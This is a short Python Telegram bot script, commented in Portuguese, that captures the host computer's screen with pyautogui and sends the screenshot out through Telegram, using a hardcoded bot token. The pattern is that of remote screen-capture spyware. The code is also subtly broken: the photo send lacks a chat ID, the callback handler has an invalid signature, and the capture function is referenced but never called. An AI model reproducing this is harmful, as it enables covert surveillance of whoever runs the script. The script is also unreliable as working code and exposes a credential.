import os
import telebot
import asyncio
import pyautogui
from httpcore import ConnectTimeout
from httpx import ConnectTimeout as HTTPXConnectTimeout

bot = telebot.TeleBot('5958478560:AAF-8gKrVZB67PZsBLvQvcGj4ozqs5SJKag')

def main():
    # Local onde a captura de tela será salva
    screenshot_path = 'screenshot.png'

    # Captura de tela
    pyautogui.screenshot(screenshot_path)

    # Função assíncrona para enviar a captura de tela
    async def send_screenshot():
        # Envia a captura de tela usando o bot do Telegram
        try:
            with open(screenshot_path, 'rb') as photo:
                bot.send_photo(photo=photo)
        except (ConnectTimeout, HTTPXConnectTimeout):
            print('Erro de tempo limite durante o envio da captura de tela.')
        except Exception as e:
            print('Ocorreu um erro ao enviar a captura de tela:', str(e))

        # Remove o arquivo de captura de tela
        os.remove(screenshot_path)

    # Create and set the event loop explicitly
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    # Executa a função assíncrona e aguarda a conclusão
    loop.run_until_complete(send_screenshot())
    loop.close()

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    markup = telebot.types.InlineKeyboardMarkup()
    itembtn1 = telebot.types.InlineKeyboardButton('HELP', callback_data='btn1')
    itembtn2 = telebot.types.InlineKeyboardButton('LOG', callback_data='btn2')
    itembtn3 = telebot.types.InlineKeyboardButton('PRINT', callback_data='btn3')
    markup.add(itembtn1, itembtn2, itembtn3)
    bot.send_message(message.chat.id, "COMANDOS:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call, message, bot):
    if call.data == 'btn1':
       send_welcome
    elif call.data == 'btn2':
        bot.answer_callback_query(call.id, "Você pressionou o Botão 2")
    elif call.data == 'btn3':
        main

bot.polling()
